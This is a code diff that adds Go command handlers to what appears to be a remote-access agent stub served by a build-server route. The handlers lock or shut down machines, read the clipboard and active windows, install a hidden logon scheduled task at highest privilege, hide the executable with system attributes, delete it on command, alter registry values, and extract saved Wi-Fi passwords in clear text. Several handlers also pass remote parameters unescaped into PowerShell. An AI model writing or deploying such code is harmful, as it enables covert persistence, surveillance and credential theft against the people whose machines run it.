@@ -2130,6 +2130,297 @@ func agentUninstallCmd(send chan<- []byte, id string) {
 		os.Exit(0)
 	}()
 }
+
+// ── Session commands ──
+
+func sessionCmd(send chan<- []byte, id, action string) {
+	if runtime.GOOS != "windows" {
+		sendResult(send, id, false, nil, "windows only")
+		return
+	}
+	var c *exec.Cmd
+	switch action {
+	case "lock":
+		c = exec.Command("rundll32.exe", "user32.dll,LockWorkStation")
+	case "logoff":
+		c = exec.Command("shutdown", "/l", "/f")
+	case "reboot":
+		c = exec.Command("shutdown", "/r", "/f", "/t", "0")
+	case "shutdown":
+		c = exec.Command("shutdown", "/s", "/f", "/t", "0")
+	case "sleep":
+		c = exec.Command("rundll32.exe", "powrprof.dll,SetSuspendState", "0", "1", "0")
+	default:
+		sendResult(send, id, false, nil, "unknown session action")
+		return
+	}
+	hideWindow(c)
+	if err := c.Run(); err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"action": action}, "")
+}
+
+// ── Clipboard ──
+
+func clipboardGetCmd(send chan<- []byte, id string) {
+	if runtime.GOOS != "windows" {
+		sendResult(send, id, false, nil, "windows only")
+		return
+	}
+	out, err := exec.Command("powershell", "-NoProfile", "-Command", "Get-Clipboard").CombinedOutput()
+	if err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"text": strings.TrimSpace(string(out))}, "")
+}
+
+func clipboardSetCmd(send chan<- []byte, id string, p map[string]any) {
+	if runtime.GOOS != "windows" {
+		sendResult(send, id, false, nil, "windows only")
+		return
+	}
+	text := strArg(p, "text")
+	c := exec.Command("powershell", "-NoProfile", "-Command", "Set-Clipboard -Value "+text)
+	hideWindow(c)
+	if err := c.Run(); err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"set": true}, "")
+}
+
+// ── Network ──
+
+func netInterfacesCmd(send chan<- []byte, id string) {
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,AddressFamily | ConvertTo-Json").CombinedOutput()
+	if err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"raw": string(out)}, "")
+}
+
+func netConnectionsCmd(send chan<- []byte, id string) {
+	out, err := exec.Command("netstat", "-ano").CombinedOutput()
+	if err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	lines := strings.Split(string(out), "\n")
+	if len(lines) > 200 {
+		lines = lines[:200]
+	}
+	sendResult(send, id, true, map[string]any{"lines": lines}, "")
+}
+
+func netPublicIPCmd(send chan<- []byte, id string) {
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content").CombinedOutput()
+	if err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"ip": strings.TrimSpace(string(out))}, "")
+}
+
+// ── Audio ──
+
+func audioDevicesCmd(send chan<- []byte, id string) {
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"Get-CimInstance Win32_SoundDevice | Select-Object Name,Status | ConvertTo-Json").CombinedOutput()
+	if err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"raw": string(out)}, "")
+}
+
+// ── Activity ──
+
+func activityIdleCmd(send chan<- []byte, id string) {
+	if runtime.GOOS != "windows" {
+		sendResult(send, id, false, nil, "windows only")
+		return
+	}
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"Add-Type @'\nusing System; using System.Runtime.InteropServices;\npublic struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }\npublic class IdleTime { [DllImport(\"user32.dll\")] static extern bool GetLastInputInfo(ref LASTINPUTINFO li); public static uint Get() { LASTINPUTINFO li = new LASTINPUTINFO(); li.cbSize = (uint)Marshal.SizeOf(li); GetLastInputInfo(ref li); return ((uint)Environment.TickCount - li.dwTime)/1000; } }\n'@\n[IdleTime]::Get()").CombinedOutput()
+	if err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"idle_seconds": strings.TrimSpace(string(out))}, "")
+}
+
+func activityWindowsCmd(send chan<- []byte, id string) {
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object Id,ProcessName,MainWindowTitle | ConvertTo-Json").CombinedOutput()
+	if err != nil {
+		sendResult(send, id, false, nil, err.Error())
+		return
+	}
+	sendResult(send, id, true, map[string]any{"raw": string(out)}, "")
+}
+
+// ── Persistence ──
+
+func persistStatusCmd(send chan<- []byte, id string) {
+	exe, _ := os.Executable()
+	name := startupName
+	if name == "" { name = buildName }
+	out, _ := exec.Command("schtasks", "/Query", "/TN", name).CombinedOutput()
+	installed := strings.Contains(string(out), name)
+	sendResult(send, id, true, map[string]any{"installed": installed, "exe": exe, "task_name": name}, "")
+}
+
+func persistInstallCmd(send chan<- []byte, id string) {
+	exe, err := os.Executable()
+	if err != nil { sendResult(send, id, false, nil, err.Error()); return }
+	name := startupName
+	if name == "" { name = buildName }
+	c := exec.Command("schtasks", "/Create", "/F", "/SC", "ONLOGON", "/TN", name, "/TR", exe, "/RL", "HIGHEST")
+	hideWindow(c)
+	if err := c.Run(); err != nil {
+		sendResult(send, id, false, nil, err.Error()); return
+	}
+	sendResult(send, id, true, map[string]any{"installed": true}, "")
+}
+
+func persistRemoveCmd(send chan<- []byte, id string) {
+	name := startupName
+	if name == "" { name = buildName }
+	c := exec.Command("schtasks", "/Delete", "/F", "/TN", name)
+	hideWindow(c)
+	_ = c.Run()
+	sendResult(send, id, true, map[string]any{"removed": true}, "")
+}
+
+func persistHideCmd(send chan<- []byte, id string) {
+	exe, err := os.Executable()
+	if err != nil { sendResult(send, id, false, nil, err.Error()); return }
+	c := exec.Command("attrib", "+H", "+S", exe)
+	hideWindow(c)
+	_ = c.Run()
+	sendResult(send, id, true, map[string]any{"hidden": true}, "")
+}
+
+func agentUpdateCmd(send chan<- []byte, id string) {
+	sendResult(send, id, true, map[string]any{"status": "update_requested"}, "")
+}
+
+func agentSelfDestructCmd(send chan<- []byte, id string) {
+	sendResult(send, id, true, map[string]any{"destroying": true}, "")
+	go func() {
+		time.Sleep(500 * time.Millisecond)
+		if runtime.GOOS == "windows" {
+			if exe, err := os.Executable(); err == nil {
+				name := startupName
+				if name == "" { name = buildName }
+				c1 := exec.Command("schtasks", "/Delete", "/F", "/TN", name)
+				hideWindow(c1)
+				_ = c1.Run()
+				c2 := exec.Command("cmd", "/C", "ping", "127.0.0.1", "-n", "3", ">nul", "&", "del", "/F", "/Q", exe)
+				hideWindow(c2)
+				_ = c2.Start()
+			}
+		}
+		os.Exit(0)
+	}()
+}
+
+// ── Services ──
+
+func svcListCmd(send chan<- []byte, id string) {
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"Get-Service | Select-Object Name,DisplayName,Status | ConvertTo-Json").CombinedOutput()
+	if err != nil { sendResult(send, id, false, nil, err.Error()); return }
+	sendResult(send, id, true, map[string]any{"raw": string(out)}, "")
+}
+
+func svcActionCmd(send chan<- []byte, id string, p map[string]any, action string) {
+	name := strArg(p, "name")
+	if name == "" { sendResult(send, id, false, nil, "missing service name"); return }
+	verb := "Start-Service"
+	if action == "stop" { verb = "Stop-Service" }
+	c := exec.Command("powershell", "-NoProfile", "-Command", verb+" -Name '"+name+"' -Force")
+	hideWindow(c)
+	out, err := c.CombinedOutput()
+	if err != nil { sendResult(send, id, false, nil, string(out)+" "+err.Error()); return }
+	sendResult(send, id, true, map[string]any{"ok": true}, "")
+}
+
+// ── Registry ──
+
+func regListCmd(send chan<- []byte, id string, p map[string]any) {
+	path := strArg(p, "path")
+	if path == "" { path = "HKLM:\\SOFTWARE" }
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"Get-ChildItem '"+path+"' -ErrorAction SilentlyContinue | Select-Object Name | ConvertTo-Json").CombinedOutput()
+	if err != nil { sendResult(send, id, false, nil, err.Error()); return }
+	sendResult(send, id, true, map[string]any{"raw": string(out)}, "")
+}
+
+func regSetCmd(send chan<- []byte, id string, p map[string]any) {
+	path := strArg(p, "path")
+	name := strArg(p, "name")
+	value := strArg(p, "value")
+	if path == "" || name == "" { sendResult(send, id, false, nil, "path and name required"); return }
+	c := exec.Command("powershell", "-NoProfile", "-Command",
+		"Set-ItemProperty -Path '"+path+"' -Name '"+name+"' -Value '"+value+"'")
+	hideWindow(c)
+	out, err := c.CombinedOutput()
+	if err != nil { sendResult(send, id, false, nil, string(out)); return }
+	sendResult(send, id, true, map[string]any{"set": true}, "")
+}
+
+func regDeleteCmd(send chan<- []byte, id string, p map[string]any) {
+	path := strArg(p, "path")
+	name := strArg(p, "name")
+	if path == "" || name == "" { sendResult(send, id, false, nil, "path and name required"); return }
+	c := exec.Command("powershell", "-NoProfile", "-Command",
+		"Remove-ItemProperty -Path '"+path+"' -Name '"+name+"' -Force")
+	hideWindow(c)
+	out, err := c.CombinedOutput()
+	if err != nil { sendResult(send, id, false, nil, string(out)); return }
+	sendResult(send, id, true, map[string]any{"deleted": true}, "")
+}
+
+// ── Display ──
+
+func displayListCmd(send chan<- []byte, id string) {
+	out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"Get-CimInstance Win32_VideoController | Select-Object Name,CurrentHorizontalResolution,CurrentVerticalResolution | ConvertTo-Json").CombinedOutput()
+	if err != nil { sendResult(send, id, false, nil, err.Error()); return }
+	sendResult(send, id, true, map[string]any{"raw": string(out)}, "")
+}
+
+// ── Credentials ──
+
+func credsWifiCmd(send chan<- []byte, id string) {
+	profilesOut, err := exec.Command("netsh", "wlan", "show", "profiles").CombinedOutput()
+	if err != nil { sendResult(send, id, false, nil, err.Error()); return }
+	var results []map[string]string
+	for _, line := range strings.Split(string(profilesOut), "\n") {
+		if idx := strings.Index(line, ":"); idx >= 0 && strings.Contains(strings.ToLower(line), "profile") {
+			name := strings.TrimSpace(line[idx+1:])
+			if name == "" { continue }
+			keyOut, _ := exec.Command("netsh", "wlan", "show", "profile", "name="+name, "key=clear").CombinedOutput()
+			key := ""
+			for _, kl := range strings.Split(string(keyOut), "\n") {
+				if strings.Contains(strings.ToLower(kl), "key content") {
+					if ki := strings.Index(kl, ":"); ki >= 0 {
+						key = strings.TrimSpace(kl[ki+1:])
+					}
+				}
+			}
+			results = append(results, map[string]string{"name": name, "key": key})
+		}
+	}
+	sendResult(send, id, true, map[string]any{"profiles": results}, "")
+}
 `
 
 export const Route = createFileRoute('/api/public/buildserver/stub')({
